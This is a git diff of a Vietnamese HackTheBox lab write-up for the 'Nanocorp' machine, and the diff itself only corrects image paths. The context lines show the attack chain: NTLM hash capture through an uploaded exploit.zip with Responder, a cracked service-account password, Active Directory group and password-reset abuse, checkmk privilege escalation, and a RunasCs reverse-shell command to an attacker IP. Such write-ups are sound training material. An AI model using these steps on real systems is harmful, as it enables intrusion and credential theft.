@@ -134,7 +134,7 @@ Mình thấy có các port mà mình cần để ý là port **`80`** là **`web
 
 ---
 
-![image](/assets/img/HTB/season9/Nonocorp/image1.png)
+![image](/assets/img/HTB/season9/Nanocorp/image1.png)
 
 Mình dùng **`dirb`** để có thể enum. 
 
@@ -195,7 +195,7 @@ DOWNLOADED: 4612 - FOUND: 17**
 
 Sau khi mình thử check thêm source thì tìm ra 1 subdomain. 
 
-![image](/assets/img/HTB/season9/Nonocorp/image2.png)
+![image](/assets/img/HTB/season9/Nanocorp/image2.png)
 
 Cho nên mình thêm đầy đủ vào trong **`/etc/hosts`** sẽ là: 
 
@@ -205,7 +205,7 @@ Cho nên mình thêm đầy đủ vào trong **`/etc/hosts`** sẽ là:
 
 Sau đó mình truy cập thử subdoamin. 
 
-![image](/assets/img/HTB/season9/Nonocorp/image3.png)
+![image](/assets/img/HTB/season9/Nanocorp/image3.png)
 
 Đây là 1 trang cho phép mình upload cv → cho việc tuyển dụng.
 
@@ -303,11 +303,11 @@ Sau đó, mình dùng responder để có thể bắt NTLM hash.
 
 Tiếp theo, mình upload file **`exploit.zip`** đó lên.
 
-![image](/assets/img/HTB/season9/Nonocorp/image4.png)
+![image](/assets/img/HTB/season9/Nanocorp/image4.png)
 
 Sau khi mình upload thành công.
 
-![image](/assets/img/HTB/season9/Nonocorp/image5.png)
+![image](/assets/img/HTB/season9/Nanocorp/image5.png)
 
 Thì tại responder thu được NTML hash của **`web_svc`** 
 
@@ -319,7 +319,7 @@ Thì tại responder thu được NTML hash của **`web_svc`**
 
 Mình copy hash này để thực hiện crack.
 
-![image](/assets/img/HTB/season9/Nonocorp/image6.png)
+![image](/assets/img/HTB/season9/Nanocorp/image6.png)
 
 Từ đây mình có thể login vào smb với account là **`web_svc:dksehdgh712!@#`** 
 
@@ -389,25 +389,25 @@ INFO: Done in 01M 25S
 INFO: Compressing output into 20251215185216_bloodhound.zip**
 ```
 
-![image](/assets/img/HTB/season9/Nonocorp/image7.png)
+![image](/assets/img/HTB/season9/Nanocorp/image7.png)
 
 Mình thấy **`web_svc`** này có thể tự add nó vào trong group **`IT_SUPPORT@NANOCORP.HTB`** 
 
 Và group này lại có **`ForgeChangePassword`** tới **`MONITORING_SVC@NANOCORP.HTB`** 
 
-![image](/assets/img/HTB/season9/Nonocorp/image8.png)
+![image](/assets/img/HTB/season9/Nanocorp/image8.png)
 
 Cho nên mình thực hiện là mình add user **`web_svc`** vào group trước đã. 
 
-![image](/assets/img/HTB/season9/Nonocorp/image9.png)
+![image](/assets/img/HTB/season9/Nanocorp/image9.png)
 
 Vậy từ đây mình sẽ reset password cho user **`MONITORING_SVC@NANOCORP.HTB`** 
 
-![image](/assets/img/HTB/season9/Nonocorp/image10.png)
+![image](/assets/img/HTB/season9/Nanocorp/image10.png)
 
 Mà user này lại có thể remote tới host **`DC01.NANOCORP.HTB`** 
 
-![image](/assets/img/HTB/season9/Nonocorp/image11.png)
+![image](/assets/img/HTB/season9/Nanocorp/image11.png)
 
 Sau khi có được credential của **`monitoring_svc`** thì mình cần lấy ticket của nó. 
 
@@ -456,7 +456,7 @@ PS C:\Users\monitoring_svc\Documents>**
 
 Sau khi đã vào remote thì mình khám phá thêm.
 
-![image](/assets/img/HTB/season9/Nonocorp/image12.png)
+![image](/assets/img/HTB/season9/Nanocorp/image12.png)
 
 ## Initial Access
 
@@ -501,7 +501,7 @@ LocalDirectory: C:\ProgramData\checkmk\agent\local
 <SNIP>**
 ```
 
-![image](/assets/img/HTB/season9/Nonocorp/image13.png)
+![image](/assets/img/HTB/season9/Nanocorp/image13.png)
 
 Từ đây mình thấy có **`TempDirectory: C:\ProgramData\checkmk\agent\tmp` → check_mk đang chạy → check process này.** 
 
@@ -518,13 +518,13 @@ Responding  : True**
 
 Nhưng mà trong file output thì lại nói id là **`1268`** 
 
-![image](/assets/img/HTB/season9/Nonocorp/image14.png)
+![image](/assets/img/HTB/season9/Nanocorp/image14.png)
 
 Mà nó lại chạy dưới quyền **`\\NT AUTHORITY\SYSTEM`** → có thể leo lên **`root`** 
 
 Sau khi tìm kiếm thì thấy có 1 CVE 
 
-![image](/assets/img/HTB/season9/Nonocorp/image15.png)
+![image](/assets/img/HTB/season9/Nanocorp/image15.png)
 
 Thì có vẻ mình có thể leo quyền dựa trên CVE này. 
 
@@ -538,15 +538,15 @@ Theo bài blog này đã nói rằng:
 
 - [https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
 
-![image](/assets/img/HTB/season9/Nonocorp/image16.png)
+![image](/assets/img/HTB/season9/Nanocorp/image16.png)
 
 Đồng thời thì có vẻ nó được trigger từ dòng lệnh này.
 
-![image](/assets/img/HTB/season9/Nonocorp/image17.png)
+![image](/assets/img/HTB/season9/Nanocorp/image17.png)
 
 Cho nên mình phải check thử xem có file này nằm trên mục tiêu ko. 
 
-![image](/assets/img/HTB/season9/Nonocorp/image18.png)
+![image](/assets/img/HTB/season9/Nanocorp/image18.png)
 
 ```bash
 **PS C:\Windows\Installer> Get-ChildItem C:\Windows\Installer\*.msi | ForEach-Object { $i = New-Object -ComObject WindowsInstaller.Installer; $db = $i.OpenDatabase($_.FullName, 0); $v = $db.O
@@ -615,7 +615,7 @@ PS C:\Users\monitoring_svc\AppData\Local\Temp>**
 
 Bắt đầu mình dùng **`penelope`** 
 
-![image](/assets/img/HTB/season9/Nonocorp/image19.png)
+![image](/assets/img/HTB/season9/Nanocorp/image19.png)
 
 ```bash
 **PS C:\Users\monitoring_svc\AppData\Local\Temp> .\RunasCs.exe 'web_svc' 'dksehdgh712!@#' powershell -r 10.10.16.72:4321
@@ -628,21 +628,21 @@ PS C:\Users\monitoring_svc\AppData\Local\Temp>**
 
 Quay lại tab **`penelope`** .
 
-![image](/assets/img/HTB/season9/Nonocorp/image20.png)
+![image](/assets/img/HTB/season9/Nanocorp/image20.png)
 
 Giờ thì mình thử trigger lại trên user **`web_svc`** 
 
-![image](/assets/img/HTB/season9/Nonocorp/image21.png)
+![image](/assets/img/HTB/season9/Nanocorp/image21.png)
 
-![image](/assets/img/HTB/season9/Nonocorp/image22.png)
+![image](/assets/img/HTB/season9/Nanocorp/image22.png)
 
 Mình thấy nó đã thay đổi PID được tạo và điều đó nó đã trigger trên **`web_svc`** 
 
-![image](/assets/img/HTB/season9/Nonocorp/image23.png)
+![image](/assets/img/HTB/season9/Nanocorp/image23.png)
 
 Mình đã vào được trong folder **`TEMP`** 
 
-![image](/assets/img/HTB/season9/Nonocorp/image24.png)
+![image](/assets/img/HTB/season9/Nanocorp/image24.png)
 
 Như vậy thì minh cần phải brute-force cái file độc hại. 
 
